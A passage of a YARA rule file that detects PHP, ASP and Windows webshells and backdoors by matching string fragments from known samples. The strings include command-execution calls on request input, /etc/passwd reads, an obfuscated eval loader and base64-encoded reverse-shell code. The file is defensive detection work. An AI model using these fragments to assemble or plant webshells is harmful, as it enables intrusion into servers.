		$s5 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
		$s15 = "<title>$MyShellVersion - Access Denied</title>" fullword
		$s16 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTT"
	condition:
		1 of them
}
rule WebShell_php_webshells_lolipop {
	meta:
		description = "PHP Webshells Github Archive - file lolipop.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "86f23baabb90c93465e6851e40104ded5a5164cb"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "$commander = $_POST['commander']; " fullword
		$s9 = "$sourcego = $_POST['sourcego']; " fullword
		$s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword
	condition:
		all of them
}
rule WebShell_simple_cmd {
	meta:
		description = "PHP Webshells Github Archive - file simple_cmd.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "466a8caf03cdebe07aa16ad490e54744f82e32c2"
		id = "1fd0c01a-c265-5e30-ab36-e8e93e316fbe"
	strings:
		$s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s2 = "<title>G-Security Webshell</title>" fullword
		$s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
	condition:
		1 of them
}
rule WebShell_go_shell {
	meta:
		description = "PHP Webshells Github Archive - file go-shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "3dd85981bec33de42c04c53d081c230b5fc0e94f"
		id = "63eaf530-050a-5db7-8885-d4a1e86d62de"
	strings:
		$s0 = "#change this password; for power security - delete this file =)" fullword
		$s2 = "if (!defined$param{cmd}){$param{cmd}=\"ls -la\"};" fullword
		$s11 = "open(FILEHANDLE, \"cd $param{dir}&&$param{cmd}|\");" fullword
		$s12 = "print << \"[kalabanga]\";" fullword
		$s13 = "<title>GO.cgi</title>" fullword
	condition:
		1 of them
}
rule WebShell_aZRaiLPhp_v1_0_2 {
	meta:
		description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
		old_rule_name = "WebShell_aZRaiLPhp_v1_0"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "a2c609d1a8c8ba3d706d1d70bef69e63f239782b"
		id = "10546549-e16d-567d-9d88-3d37fe8ff03f"
	strings:
		$s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED"
		$s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
		$s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
		$s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword
	condition:
		2 of them
}
rule WebShell_webshells_zehir4 {
	meta:
		description = "Webshells Github Archive - file zehir4"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "788928ae87551f286d189e163e55410acbb90a64"
		score = 55
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "frames.byZehir.document.execCommand(command, false, option);" fullword
		$s8 = "response.Write \"<title>ZehirIV --> Powered By Zehir &lt;zehirhacker@hotmail.com"
	condition:
		1 of them
}
rule WebShell_zehir4_asp_php {
	meta:
		description = "PHP Webshells Github Archive - file zehir4.asp.php.txt"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "1d9b78b5b14b821139541cc0deb4cbbd994ce157"
		id = "7a849bc6-fff5-5bb6-aff7-660889fd077b"
	strings:
		$s4 = "response.Write \"<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&"
		$s11 = "frames.byZehir.document.execCommand("
		$s15 = "frames.byZehir.document.execCommand(co"
	condition:
		2 of them
}
rule WebShell_php_webshells_lostDC {
	meta:
		description = "PHP Webshells Github Archive - file lostDC.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "d54fe07ea53a8929620c50e3a3f8fb69fdeb1cde"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "$info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';" fullword
		$s4 = "header ( \"Content-Description: Download manager\" );" fullword
		$s5 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" second"
		$s9 = "if (mkdir($_POST['dir'], 0777) == false) {" fullword
		$s12 = "$ret = shellexec($command);" fullword
	condition:
		2 of them
}
rule WebShell_CasuS_1_5 {
	meta:
		description = "PHP Webshells Github Archive - file CasuS 1.5.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "7eee8882ad9b940407acc0146db018c302696341"
		id = "cf89d8f8-d498-57fe-98eb-a98350db182f"
	strings:
		$s2 = "<font size='+1'color='#0000FF'><u>CasuS 1.5'in URL'si</u>: http://$HTTP_HO"
		$s8 = "$fonk_kap = get_cfg_var(\"fonksiyonlary_kapat\");" fullword
		$s18 = "if (file_exists(\"F:\\\\\")){" fullword
	condition:
		1 of them
}
rule WebShell_ftpsearch {
	meta:
		description = "PHP Webshells Github Archive - file ftpsearch.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "c945f597552ccb8c0309ad6d2831c8cabdf4e2d6"
		id = "9db8f00a-1843-5057-b8c7-a7f7b63e0659"
	strings:
		$s0 = "echo \"[-] Error : coudn't read /etc/passwd\";" fullword
		$s9 = "@$ftp=ftp_connect('127.0.0.1');" fullword
		$s12 = "echo \"<title>Edited By KingDefacer</title><body>\";" fullword
		$s19 = "echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";" fullword
	condition:
		2 of them
}
rule WebShell__Cyber_Shell_cybershell_Cyber_Shell__v_1_0_ {
	meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
		id = "79146f25-87b9-5216-af88-4e433bb08b90"
	strings:
		$s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</"
		$s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh"
		$s11 = " *   Coded by Pixcher" fullword
		$s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword
	condition:
		2 of them
}
rule WebShell__Ajax_PHP_Command_Shell_Ajax_PHP_Command_Shell_soldierofallah {
	meta:
		description = "PHP Webshells Github Archive - from files Ajax_PHP Command Shell.php, Ajax_PHP_Command_Shell.php, soldierofallah.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "fa11deaee821ca3de7ad1caafa2a585ee1bc8d82"
		hash1 = "c0a4ba3e834fb63e0a220a43caaf55c654f97429"
		hash2 = "16fa789b20409c1f2ffec74484a30d0491904064"
		id = "a158d158-d48d-514c-8b7b-4b6a4a10d021"
	strings:
		$s1 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword
		$s2 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword
		$s3 = "$dt = $_POST['filecontent'];" fullword
		$s4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword
		$s6 = "print \"Sorry, none of the command functions works.\";" fullword
		$s11 = "document.cmdform.command.value='';" fullword
		$s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST"
	condition:
		3 of them
}
rule WebShell_Generic_PHP_7 {
	meta:
		description = "PHP Webshells Github Archive"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "de98f890790756f226f597489844eb3e53a867a9"
		hash1 = "128988c8ef5294d51c908690d27f69dffad4e42e"
		hash2 = "fd64f2bf77df8bcf4d161ec125fa5c3695fe1267"
		hash3 = "715f17e286416724e90113feab914c707a26d456"
		id = "506373d6-31b4-5a14-b009-f2b43028a98b"
	strings:
		$s0 = "header(\"Content-disposition: filename=$filename.sql\");" fullword
		$s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword
		$s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword
		$s4 = "if( $action == \"dumpTable\" )" fullword
	condition:
		2 of them
}
rule WebShell__Small_Web_Shell_by_ZaCo_small_zaco_zacosmall {
	meta:
		description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "b148ead15d34a55771894424ace2a92983351dda"
		hash1 = "e4ba288f6d46dc77b403adf7d411a280601c635b"
		hash2 = "e5713d6d231c844011e9a74175a77e8eb835c856"
		hash3 = "1b836517164c18caf2c92ee2a06c645e26936a0c"
		id = "99dbcea6-7208-5bbe-b200-9ea3074d7855"
	strings:
		$s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
		$s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
		$s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
		$s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword
	condition:
		2 of them
}
rule WebShell_Generic_PHP_8 {
	meta:
		description = "PHP Webshells Github Archive"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "fc1ae242b926d70e32cdb08bbe92628bc5bd7f99"
		hash1 = "9ad55629c4576e5a31dd845012d13a08f1c1f14e"
		hash2 = "c4aa2cf665c784553740c3702c3bfcb5d7af65a3"
		id = "40c6f69f-9963-5e4f-af44-041d47738519"
	strings:
		$s1 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword
		$s2 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
		$s3 = "/* I added this to ensure the script will run correctly..." fullword
		$s14 = "<!--    </form>   -->" fullword
		$s15 = "<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">" fullword
		$s20 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword
	condition:
		3 of them
}
rule WebShell__PH_Vayv_PHVayv_PH_Vayv_klasvayv_asp_php {
	meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php, klasvayv.asp.php.txt"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
		hash3 = "4f83bc2836601225a115b5ad54496428a507a361"
		id = "1575591b-3245-5c3d-b2a4-6def89e77032"
	strings:
		$s1 = "<font color=\"#000000\">Sil</font></a></font></td>" fullword
		$s5 = "<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">" fullword
		$s6 = "onfocus=\"if (this.value == 'Kullan" fullword
		$s16 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">"
	condition:
		2 of them
}

rule WebShell_Generic_PHP_9 {
   meta:
      description = "PHP Webshells Github Archive - from files KAdot Universal Shell v0.1.6.php, KAdot_Universal_Shell_v0.1.6.php, KA_uShell 0.1.6.php"
      author = "Florian Roth (Nextron Systems)"
      super_rule = 1
      date = "2014/04/06"
      modified = "2022-12-06"
      score = 70
      reference = "Internal Research"
      hash0 = "89f2a7007a2cd411e0a7abd2ff5218d212b84d18"
      hash1 = "2266178ad4eb72c2386c0a4d536e5d82bb7ed6a2"
      hash2 = "0daed818cac548324ad0c5905476deef9523ad73"
      id = "98927127-08be-57ac-a090-38c7e614dae7"
   strings:
      $ = { 3a 3c 62 3e 22 20 2e 62 61 73 65 36 34 5f 64 65 63 6f 64 65 28 24 5f 50 4f 53 54 5b 27 74 6f 74 27 5d 29 2e 20 22 3c 2f 62 3e 22 3b }
      $ = { 69 66 20 28 69 73 73 65 74 28 24 5f 50 4f 53 54 5b 27 77 71 27 5d 29 20 26 26 20 24 5f 50 4f 53 54 5b 27 77 71 27 5d 3c 3e 22 22 29 20 7b }
      $ = { 70 61 73 73 74 68 72 75 28 24 5f 50 4f 53 54 5b 27 63 27 5d 29 3b }
      $ = { 3c 69 6e 70 75 74 20 74 79 70 65 3d 22 72 61 64 69 6f 22 20 6e 61 6d 65 3d 22 74 61 63 22 20 76 61 6c 75 65 3d 22 31 22 3e 42 36 34 20 44 65 63 6f 64 65 3c 62 72 3e }
   condition:
      1 of them
}

rule WebShell__PH_Vayv_PHVayv_PH_Vayv {
	meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
		id = "1575591b-3245-5c3d-b2a4-6def89e77032"
	strings:
		$s4 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle"
		$s12 = "<? if ($ekinci==\".\" or  $ekinci==\"..\") {" fullword
		$s17 = "name=\"duzenx2\" value=\"Klas" fullword
	condition:
		2 of them
}

rule WebShell_Generic_PHP_1 {
   meta:
      description = "PHP Webshells Github Archive - from files Dive Shell 1.0"
      author = "Florian Roth (Nextron Systems)"
      super_rule = 1
      score = 70
      date = "2014/04/06"
      modified = "2022-12-06"
      hash0 = "3b086b9b53cf9d25ff0d30b1d41bb2f45c7cda2b"
      hash1 = "2558e728184b8efcdb57cfab918d95b06d45de04"
      hash2 = "203a8021192531d454efbc98a3bbb8cabe09c85c"
      hash3 = "b79709eb7801a28d02919c41cc75ac695884db27"
      id = "9a87038b-3f78-5b9a-a209-c9026d83363f"
   strings:
      $ = { 76 61 72 20 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 20 3d 20 6e 65 77 20 41 72 72 61 79 28 3c 3f 70 68 70 20 65 63 68 6f 20 24 6a 73 5f 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 20 3f 3e 29 3b }
      $ = { 69 66 20 28 65 6d 70 74 79 28 24 5f 53 45 53 53 49 4f 4e 5b 27 63 77 64 27 5d 29 20 7c 7c 20 21 65 6d 70 74 79 28 24 5f 52 45 51 55 45 53 54 5b 27 72 65 73 65 74 27 5d 29 29 20 7b }
      $ = { 69 66 20 28 65 2e 6b 65 79 43 6f 64 65 20 3d 3d 20 33 38 20 26 26 20 63 75 72 72 65 6e 74 5f 6c 69 6e 65 20 3c 20 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 2e 6c 65 6e 67 74 68 2d 31 29 20 7b }
   condition:
      1 of them
}

rule WebShell_Generic_PHP_2 {
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash2 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash3 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
		id = "be335331-34d7-5abc-b29b-eac7a5ec3915"
	strings:
		$s3 = "if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))" fullword
		$s4 = "\\$port = {$_POST['port']};"
		$s5 = "$_POST['installpath'] = \"temp.pl\";}" fullword
		$s14 = "if(isset($_POST['post']) and $_POST['post'] == \"yes\" and @$HTTP_POST_FILES[\"u"
		$s16 = "copy($HTTP_POST_FILES[\"userfile\"][\"tmp_name\"],$HTTP_POST_FILES[\"userfile\"]"
	condition:
		4 of them
}
rule WebShell__CrystalShell_v_1_erne_stres {
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, erne.php, stres.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "6eb4ab630bd25bec577b39fb8a657350bf425687"
		hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
		id = "4e73e42e-b968-5b68-a00d-d2a8a1f3541c"
	strings:
		$s1 = "<input type='submit' value='  open (shill.txt) '>" fullword
		$s4 = "var_dump(curl_exec($ch));" fullword
		$s7 = "if(empty($_POST['Mohajer22'])){" fullword
		$s10 = "$m=$_POST['curl'];" fullword
		$s13 = "$u1p=$_POST['copy'];" fullword
		$s14 = "if(empty(\\$_POST['cmd'])){" fullword
		$s15 = "$string = explode(\"|\",$string);" fullword
		$s16 = "$stream = imap_open(\"/etc/passwd\", \"\", \"\");" fullword
	condition:
		5 of them
}
rule WebShell_Generic_PHP_3 {
	meta:
		description = "PHP Webshells Github Archive"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "d829e87b3ce34460088c7775a60bded64e530cd4"
		hash1 = "d710c95d9f18ec7c76d9349a28dd59c3605c02be"
		hash2 = "f044d44e559af22a1a7f9db72de1206f392b8976"
		hash3 = "41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289"
		id = "ff7c6534-efcf-565e-bfc0-1eaa2e9d7b7d"
	strings:
		$s0 = "header('Content-Length:'.filesize($file).'');" fullword
		$s4 = "<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\".@$_POST['comma"
		$s7 = "if(filetype($dir . $file)==\"file\")$files[]=$file;" fullword
		$s14 = "elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} " fullword
		$s20 = "$info .= (($perms & 0x0004) ? 'r' : '-');" fullword
	condition:
		all of them
}
rule WebShell_Generic_PHP_4 {
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, load_shell.php, nshell.php, Loaderz WEB Shell.php, stres.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash2 = "86bc40772de71b1e7234d23cab355e1ff80c474d"
		hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
		id = "2932cb85-927e-536b-b8d8-a0ac0d1ef8ec"
	strings:
		$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
		$s2 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-';" fullword
		$s5 = "$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';" fullword
		$s6 = "$world[\"write\"] = ($mode & 00002) ? 'w' : '-';" fullword
		$s7 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';" fullword
		$s10 = "foreach ($arr as $filename) {" fullword
		$s19 = "else if( $mode & 0x6000 ) { $type='b'; }" fullword
	condition:
		all of them
}

rule WebShell_GFS {
	meta:
		description = "PHP Webshells Github Archive - from files GFS web-shell ver 3.1.7 - PRiV8.php, Predator.php, GFS_web-shell_ver_3.1.7_-_PRiV8.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "c2f1ef6b11aaec255d4dd31efad18a3869a2a42c"
		hash1 = "34f6640985b07009dbd06cd70983451aa4fe9822"
		hash2 = "d25ef72bdae3b3cb0fc0fdd81cfa58b215812a50"
		id = "bde6cfd8-466f-528a-b1e3-f874aa778010"
	strings:
		$s0 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword
		$s1 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";" fullword
		$s2 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm"
	condition:
		all of them
}
rule WebShell__CrystalShell_v_1_sosyete_stres {
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, sosyete.php, stres.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "e32405e776e87e45735c187c577d3a4f98a64059"
		hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
		id = "774f7f4c-724a-5eb0-b5de-44b389fd593d"
	strings:
		$s1 = "A:visited { COLOR:blue; TEXT-DECORATION: none}" fullword
		$s4 = "A:active {COLOR:blue; TEXT-DECORATION: none}" fullword
		$s11 = "scrollbar-darkshadow-color: #101842;" fullword
		$s15 = "<a bookmark=\"minipanel\">" fullword
		$s16 = "background-color: #EBEAEA;" fullword
		$s18 = "color: #D5ECF9;" fullword
		$s19 = "<center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 border"
	condition:
		all of them
}
rule WebShell_Generic_PHP_10 {
	meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php, PHPRemoteView.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
		hash3 = "7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57"
		id = "f52013d6-72ce-544c-a7ef-ae2a2ea87108"
	strings:
		$s2 = "$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; " fullword
		$s6 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; " fullword
		$s11 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; " fullword
		$s12 = "else if( $mode & 0xA000 ) " fullword
		$s17 = "$s=sprintf(\"%1s\", $type); " fullword
		$s20 = "font-size: 8pt;" fullword
	condition:
		all of them
}
rule WebShell_Generic_PHP_11 {
	meta:
		description = "PHP Webshells Github Archive - from files rootshell.php, Rootshell.v.1.0.php, s72 Shell v1.1 Coding.php, s72_Shell_v1.1_Coding.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "31a82cbee8dffaf8eb7b73841f3f3e8e9b3e78cf"
		hash1 = "838c7191cb10d5bb0fc7460b4ad0c18c326764c6"
		hash2 = "8dfcd919d8ddc89335307a7b2d5d467b1fd67351"
		hash3 = "80aba3348434c66ac471daab949871ab16c50042"
		id = "590c5320-ef85-5522-94fd-4619749f7eb1"
	strings:
		$s5 = "$filename = $backupstring.\"$filename\";" fullword
		$s6 = "while ($file = readdir($folder)) {" fullword
		$s7 = "if($file != \".\" && $file != \"..\")" fullword
		$s9 = "$backupstring = \"copy_of_\";" fullword
		$s10 = "if( file_exists($file_name))" fullword
		$s13 = "global $file_name, $filename;" fullword
		$s16 = "copy($file,\"$filename\");" fullword
		$s18 = "<td width=\"49%\" height=\"142\">" fullword
	condition:
		all of them
}
rule WebShell__findsock_php_findsock_shell_php_reverse_shell {
	meta:
		description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "5622c9841d76617bfc3cd4cab1932d8349b7044f"
		hash1 = "4a20f36035bbae8e342aab0418134e750b881d05"
		hash2 = "40dbdc0bdf5218af50741ba011c5286a723fa9bf"
		id = "6567c8f1-bd7f-5844-b937-3db2d8eb7408"
	strings:
		$s1 = "// me at pentestmonkey@pentestmonkey.net" fullword
	condition:
		all of them
}
rule WebShell_Generic_PHP_6 {
	meta:
		description = "PHP Webshells Github Archive"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		super_rule = 1
		hash0 = "1a08f5260c4a2614636dfc108091927799776b13"
		hash1 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash2 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
		id = "e61ec617-565a-5b24-82f4-3677ef379a06"
	strings:
		$s2 = "@eval(stripslashes($_POST['phpcode']));" fullword
		$s5 = "echo shell_exec($com);" fullword
		$s7 = "if($sertype == \"winda\"){" fullword
		$s8 = "function execute($com)" fullword
		$s12 = "echo decode(execute($cmd));" fullword
		$s15 = "echo system($com);" fullword
	condition:
		4 of them
}

rule Unpack_Injectt {
	meta:
		description = "Webshells Auto-generated - file Injectt.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "8a5d2158a566c87edc999771e12d42c5"
		id = "80dc3086-41a6-5e30-bbf4-463500fe5e33"
	strings:
		$s2 = "%s -Run                              -->To Install And Run The Service"
		$s3 = "%s -Uninstall                        -->To Uninstall The Service"
		$s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN"
	condition:
		all of them
}
rule HYTop_DevPack_fso {
	meta:
		description = "Webshells Auto-generated - file fso.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b37f3cde1a08890bd822a182c3a881f6"
		id = "094eeff9-0da0-5a44-a45c-f8ee57861e7a"
	strings:
		$s0 = "<!-- PageFSO Below -->"
		$s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli"
	condition:
		all of them
}
rule FeliksPack3___PHP_Shells_ssh {
	meta:
		description = "Webshells Auto-generated - file ssh.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "1aa5307790d72941589079989b4f900e"
		id = "0b971065-df16-5092-beff-c55608447f19"
	strings:
		$s0 = "eval(gzinflate(str_rot13(base64_decode('"
	condition:
		all of them
}
rule Debug_BDoor {
	meta:
		description = "Webshells Auto-generated - file BDoor.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "e4e8e31dd44beb9320922c5f49739955"
		id = "0938efe7-2b6d-5749-af9a-967cca85defb"
	strings:
		$s1 = "\\BDoor\\"
		$s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
	condition:
		all of them
}
rule bin_Client {
	meta:
		description = "Webshells Auto-generated - file Client.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "5f91a5b46d155cacf0cc6673a2a5461b"
		id = "8564d787-5edc-59b0-b1ef-2f33c8a24f82"
	strings:
		$s0 = "Recieved respond from server!!"
		$s4 = "packet door client"
		$s5 = "input source port(whatever you want):"
		$s7 = "Packet sent,waiting for reply..."
	condition:
		all of them
}
rule ZXshell2_0_rar_Folder_ZXshell {
	meta:
		description = "Webshells Auto-generated - file ZXshell.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "246ce44502d2f6002d720d350e26c288"
		id = "621ac87e-b1f8-58d7-9328-54af5ca9b605"
	strings:
		$s0 = "WPreviewPagesn"
